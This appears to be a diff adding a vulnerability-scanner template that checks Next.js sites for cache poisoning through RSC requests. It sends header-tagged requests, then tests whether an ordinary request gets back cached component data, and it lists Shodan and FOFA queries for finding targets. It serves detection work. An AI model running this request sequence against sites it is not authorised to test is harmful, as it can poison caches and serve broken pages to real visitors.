@@ -1,0 +1,51 @@
+id: nextjs-rsc-cache
+
+info:
+  name: Next.js - Cache Poisoning
+  author: DhiyaneshDk
+  severity: high
+  description: |
+     Next.js is vulnerable to Cache Poisoning using RSC.
+  reference:
+    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
+  metadata:
+    verified: true
+    vendor: vercel
+    product: next.js
+    framework: node.js
+    shodan-query:
+      - http.html:"/_next/static"
+      - cpe:"cpe:2.3:a:zeit:next.js"
+    fofa-query: body="/_next/static"
+  tags: nextjs,cache
+
+variables:
+  rand: "{{rand_text_numeric(5)}}"
+
+http:
+  - raw:
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        Priority: u=1
+        Rsc: 1
+
+      - |
+        @timeout: 10s
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        Priority: u=1
+        Rsc: 1
+
+      - |
+        @timeout: 10s
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(content_type_2, 'text/x-component') && !contains(cache_control_2, 'no-cache') && !contains(pragma_2, 'no-cache')"
+          - "status_code_3 == 200 && contains(content_type_3, 'text/x-component') && !contains(cache_control_3, 'no-cache') && !contains(pragma_3, 'no-cache')"
+        condition: and
+# digest: 4a0a00473045022100d0135674dc8b38b5a79f9797c92e0fba29d38801b79429e9a057ed8c930cb60a0220155e10151994bd13eddb6e0df5c3d691722e0b885e028693957ba7a8ee36cce7:922c64590222798bb761d5b6d8e72950
